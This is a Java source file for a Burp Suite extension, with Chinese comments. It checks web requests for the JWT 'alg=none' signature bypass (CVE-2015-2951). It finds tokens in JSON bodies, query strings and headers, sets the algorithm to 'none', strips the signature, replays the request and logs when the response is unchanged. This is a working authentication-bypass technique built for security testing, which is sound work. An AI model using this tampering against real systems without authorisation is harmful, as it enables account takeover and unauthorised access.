package com.alumm0x.task;

import burp.BurpExtender;

import com.alumm0x.impl.VulTaskImpl;
import com.alumm0x.listensers.HttpRequestResponseWithMarkers;
import com.alumm0x.ui.MainPanel;
import com.alumm0x.util.BurpReqRespTools;
import com.alumm0x.util.param.ParamHandlerImpl;
import com.alumm0x.util.param.ParamKeyValue;
import com.alumm0x.util.param.form.FormTools;
import com.alumm0x.util.param.header.HeaderTools;
import com.alumm0x.util.param.json.JsonTools;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;
import org.jetbrains.annotations.NotNull;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Objects;

public class JWTSignNone extends VulTaskImpl {

    /*
     * JWT未校验签名检测。签名设置为none，重放请求查看响应是否一样。(CVE-2015-2951)";
     */
    boolean useJWT = false;

    public static VulTaskImpl getInstance(HttpRequestResponseWithMarkers requestResponse){
        return new JWTSignNone(requestResponse);
    }
    private JWTSignNone(HttpRequestResponseWithMarkers requestResponse) {
        super(requestResponse);
    }

    @SuppressWarnings("unchecked")
    @Override
    public void run() {
        List<String> suffix = new ArrayList<>();
        suffix.add(".js");
        // 后缀检查，静态资源不做测试
        if (!isStaticSource(BurpReqRespTools.getUrlPath(requestResponse), suffix)){
            // 检查json数据
            JsonTools tools = new JsonTools();
            if (BurpReqRespTools.getContentType(requestResponse).contains("application/json")
                    && BurpReqRespTools.getReqBody(requestResponse).length > 0
                    && new String(BurpReqRespTools.getReqBody(requestResponse)).startsWith("{")) {
                try {
                    tools.jsonObjHandler(Objects.requireNonNull(JsonTools.jsonObjectToMap(new String(BurpReqRespTools.getReqBody(requestResponse)))), new ParamHandlerImpl() {
                        @Override
                        public List<ParamKeyValue> handler(Object key, Object value) {
                            List<ParamKeyValue> paramKeyValues = new ArrayList<>();
                            byte[] decode = BurpExtender.helpers.base64Decode(value.toString());
                            if (new String(decode).contains("\"alg\"")) {
                                useJWT = true; // 标记使用了JWT，需要进行测试
                                String jwt_header = "";
                                String jwt_payload = "";
                                for (String t : Arrays.copyOfRange(value.toString().split("\\."), 0, 2)) {
                                    JsonTools tools = new JsonTools();
                                    tools.jsonObjHandler(Objects.requireNonNull(JsonTools.jsonObjectToMap(new String(BurpExtender.helpers.base64Decode(t)))), new ParamHandlerImpl() {
                                        @Override
                                        public List<ParamKeyValue> handler(Object key, Object value) {
                                            List<ParamKeyValue> paramKeyValues = new ArrayList<>();
                                            if (key.toString().equals("alg")) {
                                                paramKeyValues.add(new ParamKeyValue(key, "none"));
                                            } else {
                                                paramKeyValues.add(new ParamKeyValue(key, value));
                                            }
                                            return paramKeyValues;
                                        }
                                    });
                                    if (tools.toString().contains("alg")) {
                                        jwt_header = tools.toString();
                                    } else {
                                        jwt_payload = tools.toString();
                                    }
                                }
                                paramKeyValues.add(new ParamKeyValue(key, String.format("%s.%s", BurpExtender.helpers.base64Encode(jwt_header), BurpExtender.helpers.base64Encode(jwt_payload))));
                            } else {
                                paramKeyValues.add(new ParamKeyValue(key, value));
                            }
                            return paramKeyValues;
                        }

                    });
                } catch (Exception e) {
                    BurpExtender.callbacks.printError("[JWTSignNone.run] " + e.getMessage());
                }
            }
            // 查询参数
            FormTools query = new FormTools();
            query.formHandler(BurpReqRespTools.getQueryMap(requestResponse), new ParamHandlerImpl() {
                @Override
                public List<ParamKeyValue> handler(Object key, Object value) {
                    List<ParamKeyValue> paramKeyValues = new ArrayList<>();
                    byte[] decode = BurpExtender.helpers.base64Decode(value.toString());
                    if (new String(decode).contains("\"alg\"")) {
                        useJWT = true; // 标记使用了JWT，需要进行测试
                        String jwt_header = "";
                        String jwt_payload = "";
                        for (String t : Arrays.copyOfRange(value.toString().split("\\."), 0, 2)) {
                            JsonTools tools = new JsonTools();
                            tools.jsonObjHandler(Objects.requireNonNull(JsonTools.jsonObjectToMap(new String(BurpExtender.helpers.base64Decode(t)))), new ParamHandlerImpl() {
                                @Override
                                public List<ParamKeyValue> handler(Object key, Object value) {
                                    List<ParamKeyValue> paramKeyValues = new ArrayList<>();
                                    if (key.toString().equals("alg")) {
                                        paramKeyValues.add(new ParamKeyValue(key, "none"));
                                    } else {
                                        paramKeyValues.add(new ParamKeyValue(key, value));
                                    }
                                    return paramKeyValues;
                                }
                            });
                            if (tools.toString().contains("alg")) {
                                jwt_header = tools.toString();
                            } else {
                                jwt_payload = tools.toString();
                            }
                        }
                        paramKeyValues.add(new ParamKeyValue(key, String.format("%s.%s", BurpExtender.helpers.base64Encode(jwt_header), BurpExtender.helpers.base64Encode(jwt_payload))));
                    } else {
                        paramKeyValues.add(new ParamKeyValue(key, value));
                    }
                    return paramKeyValues;
                }
            });
            // 处理header的数据
            HeaderTools header = new HeaderTools();
            header.headerHandler(BurpReqRespTools.getReqHeadersToMap(requestResponse), new ParamHandlerImpl() {
                @Override
                public List<ParamKeyValue> handler(Object key, Object valueObject) {
                    String value = valueObject.toString();
                    // JWT会用在Authorization头部，但是这个头部的value前面会带一个认证类型，空格隔，后面的才是真实的value，这里做一下处理
                    if (key.toString().equalsIgnoreCase("Authorization")) {
                        value = value.split("\\s+", 2)[1];
                    }
                    List<ParamKeyValue> paramKeyValues = new ArrayList<>();
                    byte[] decode = BurpExtender.helpers.base64Decode(value);
                    if (new String(decode).contains("\"alg\"")) {
                        useJWT = true; // 标记使用了JWT，需要进行测试
                        String jwt_header = "";
                        String jwt_payload = "";
                        for (String t : Arrays.copyOfRange(value.split("\\."), 0, 2)) {
                            JsonTools tools = new JsonTools();
                            tools.jsonObjHandler(Objects.requireNonNull(JsonTools.jsonObjectToMap(new String(BurpExtender.helpers.base64Decode(t)))), new ParamHandlerImpl() {
                                @Override
                                public List<ParamKeyValue> handler(Object key, Object value) {
                                    List<ParamKeyValue> paramKeyValues = new ArrayList<>();
                                    if (key.toString().equals("alg")) {
                                        paramKeyValues.add(new ParamKeyValue(key, "none"));
                                    } else {
                                        paramKeyValues.add(new ParamKeyValue(key, value));
                                    }
                                    return paramKeyValues;
                                }
                            });
                            if (tools.toString().contains("alg")) {
                                jwt_header = tools.toString();
                            } else {
                                jwt_payload = tools.toString();
                            }
                        }
                        paramKeyValues.add(new ParamKeyValue(key, String.format("%s.%s", BurpExtender.helpers.base64Encode(jwt_header), BurpExtender.helpers.base64Encode(jwt_payload))));
                    } else {
                        paramKeyValues.add(new ParamKeyValue(key, value));
                    }
                    return paramKeyValues;
                }
            });
            // 因为不知道是哪个参数有jwt，所以query/body/header都处理一边，再请求一次
            if (useJWT) {
                //新的请求包
                okHttpRequester.send(
                    BurpReqRespTools.getUrlWithOutQuery(requestResponse), 
                    BurpReqRespTools.getMethod(requestResponse), 
                    header.NEW_HEADER,
                    query.toString(),
                    tools.toString(),
                    BurpReqRespTools.getContentType(requestResponse), 
                    new JWTSignNoneCallback(this));
            }
        }
    }
}

class JWTSignNoneCallback implements Callback {
    
    VulTaskImpl vulTask;

    public JWTSignNoneCallback(VulTaskImpl vulTask){
        this.vulTask = vulTask;
    }

    @Override
    public void onFailure(@NotNull Call call, @NotNull IOException e) {
        // 记录日志
        HttpRequestResponseWithMarkers requestResponse = new HttpRequestResponseWithMarkers(BurpReqRespTools.makeBurpReqRespFormOkhttp(call, null, vulTask.requestResponse));
        MainPanel.logAdd(
            requestResponse, 
            BurpReqRespTools.getHost(requestResponse), 
            BurpReqRespTools.getUrlPathWithQuery(requestResponse),
            BurpReqRespTools.getMethod(requestResponse), 
            BurpReqRespTools.getStatus(requestResponse), 
            JWTSignNone.class.getSimpleName(),
            "onFailure", 
            "[JWTSignNoneCallback-onFailure] " + e.getMessage());
    }

    @Override
    public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {
        String message = null;
        HttpRequestResponseWithMarkers requestResponse = new HttpRequestResponseWithMarkers(BurpReqRespTools.makeBurpReqRespFormOkhttp(call, response, vulTask.requestResponse));
        if (response.code() == BurpReqRespTools.getStatus(vulTask.requestResponse) 
            && Arrays.equals(BurpReqRespTools.getRespBody(requestResponse),BurpReqRespTools.getRespBody(vulTask.requestResponse))) {
            message = "设置alg=none后请求正常";
        }
        // 记录日志
        MainPanel.logAdd(
            requestResponse, 
            BurpReqRespTools.getHost(requestResponse), 
            BurpReqRespTools.getUrlPathWithQuery(requestResponse),
            BurpReqRespTools.getMethod(requestResponse), 
            BurpReqRespTools.getStatus(requestResponse), 
            JWTSignNone.class.getSimpleName(),
            message, 
            null);
    }
}